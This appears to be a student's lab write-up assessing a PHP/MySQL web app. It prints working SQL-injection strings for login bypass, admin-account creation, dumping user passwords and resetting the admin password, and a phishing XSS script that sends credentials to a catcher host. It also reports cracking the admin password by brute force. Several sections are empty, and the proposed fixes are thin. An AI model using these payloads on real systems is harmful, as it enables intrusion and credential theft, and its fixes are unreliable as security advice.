# TASK 1: BLACK BOX ASSESSMENT

# Problem: Brute foce
The login page allows unlimited login times, hacker can used an password cracker software to crack the system.

# Test/ Example that demonstrate Unprotected Attributes Problem
Using THC-Hydra, I found username: admin and password: dragon of the administrator.

# Fixing the Unprotected Attributes Problem
Add a limitation login time variable, if user try to login more than that variable, the system will lock down for a while.


# Problem: Cookie theft
Try to put a short Javascript to username, user email box in the register form, the system accept those accounts.
Then I login with admin account, see the member list, the script activated.
We can put a script to stole the administrator cookie in username when register a new user. 
After we get the cookie, use Firefox addon Web Developer and its function add cookie to use the cookie.

# Test/ Example that demonstrate Unprotected Attributes Problem



# Fixing the Unprotected Attributes Problem
Only allow character and number in the input fields.



# Problem: SQL Injection
Try to put 1' to the username box in login page, I have and error:
Error eksekusi:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'')' at line 6.
I guess the SQL query for authentication is:
```
SELECT * FROM table WHERE username = ('$username') and password = '$password'
```
So we can put a wrong username in to bypass the password.

# Test/ Example that demonstrate Unprotected Attributes Problem
Login with a random password and username is: 

```
admin') or ('true' '
```

We can login to admin account.

# Fixing the Unprotected Attributes Problem
Only allow character and number in the input fields.


# Problem: Phishing with XSS
The note allow us to put script in, we can post a note with a script required user to login.
After user put their username, password in, the script will send it to hacker.

# Test/ Example that demonstrate Unprotected Attributes Problem
Using the phishing script from WebGoat, I post a new note with a 'hot title' like example "Bin Laden still alive" etc..., then the content of the note is:

```
<script>function hack(){ alert("Had this been a real attack... Your credentials were just stolen. User Name = " + document.forms[0].user.value + "Password = " + document.forms[0].pass.value); XSSImage=new Image; XSSImage.src="http://localhostcatcher?PROPERTY=yes&user="+ document.forms[0].user.value + "&password=" + document.forms[0].pass.value + "";} </script><form><br><br><HR><H3>This feature requires account login:</H3 ><br><br>Enter Username:<br><input type="text" id="user" name="user"><br>Enter Password:<br><input type="password" name = "pass"><br><input type="submit" name="login" value="login" onclick="hack()"></form><br><br><HR>
```


# Fixing the Unprotected Attributes Problem



# Problem: Store XSS Attacks
Since we can store Javascript as username, user email, note content we can put some attack scripts in those field.
When administrator open the memberlist, or when visitor open a note, they'll be attacked.

# Test/ Example that demonstrate Unprotected Attributes Problem


# Fixing the Unprotected Attributes Problem
Only allow character and number in the input fields.

# TASK 2: WHITE BOX ASSESSMENT

# Problem: SQL Injection, register a new user with admin level
Search in the register.php file, I found the SQL query to create new user:

```
$query = "
	INSERT INTO master_user (user_id,user_email,user_name,user_password,user_level) 
	VALUES ('$user_id','$user_email','$user_name','$password','1')
	";
```

The user name and user email field allow us to put in 150 characters can be used.
Also looking in the login.php file, I found the admin page can be access with level = 9.

# Test/ Example that demonstrate Unprotected Attributes Problem

We register a new user, put in user real name the following string:

```
Name', 'c4ca4238a0b923820dcc509a6f75849b', '9') #
```

We will have a new user with user real name is Name, password is 1 (md5), and has admin level.
Otherwise we can put in email field:

```
Email','Name', 'c4ca4238a0b923820dcc509a6f75849b', '9') #
```

# Fixing the Unprotected Attributes Problem
Only allow character and number in the input fields.


# Problem: SQL Injection, show user information
Looking in the html.php file, the query for getting web content is:

```
$query = "
	SELECT *
	FROM webpg 
	WHERE webpg_id='$id'
	";
```

Try to put http://192.168.15.224/jurpo/html.php?id=3' in the addressbar, I've got an error:
Error eksekusi:
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''3''' at line 3
We can put a SELECT query to get the user information.
See the webpg table, it has three columns webpg_id, webpg_content, webpg_title.

# Test/ Example that demonstrate Unprotected Attributes Problem
Using the UNION SELECT query, group user_id, user_email, user_password for each user (with CONCAT) and group all users with GROUP_CONCAT, put them to content of the page.
The final string to put into the addressbar is:

```
http://192.168.15.224/jurpo/html.php?id=3' UNION SELECT user_id  AS webpg_id,'The list' AS webpg_title,GROUP_CONCAT(CONCAT('ID:',master_user_id,' Email:',user_email,' Login ID:',user_id,' Password:',user_password) SEPARATOR '  This is a bird --(*V*)--  ') AS webpg_content FROM master_user WHERE 't'='t
```

# Fixing the Unprotected Attributes Problem



# Problem: SQL Injection, change admin password

# Test/ Example that demonstrate Unprotected Attributes Problem

# Fixing the Unprotected Attributes Problem






Update


UPDATE master_user SET user_password = 'holyshit' WHERE user_id = 'admin'


1', 'c4ca4238a0b923820dcc509a6f75849b', '9'); UPDATE master_user SET user_password = 'holyshit' WHERE user_id = 'admin'#

holyshit','holyshit','1'); UPDATE master_user SET user_password = 'holyshit' WHERE user_id = 'admin'#


$query = "
INSERT INTO master_user (user_id,user_email,user_name,user_password,user_level) 
VALUES ('holyshit','holyshit','holyshit','holyshit','1');
UPDATE master_user SET user_password = 'holyshit' WHERE user_id = 'admin' #','$user_password','1')
";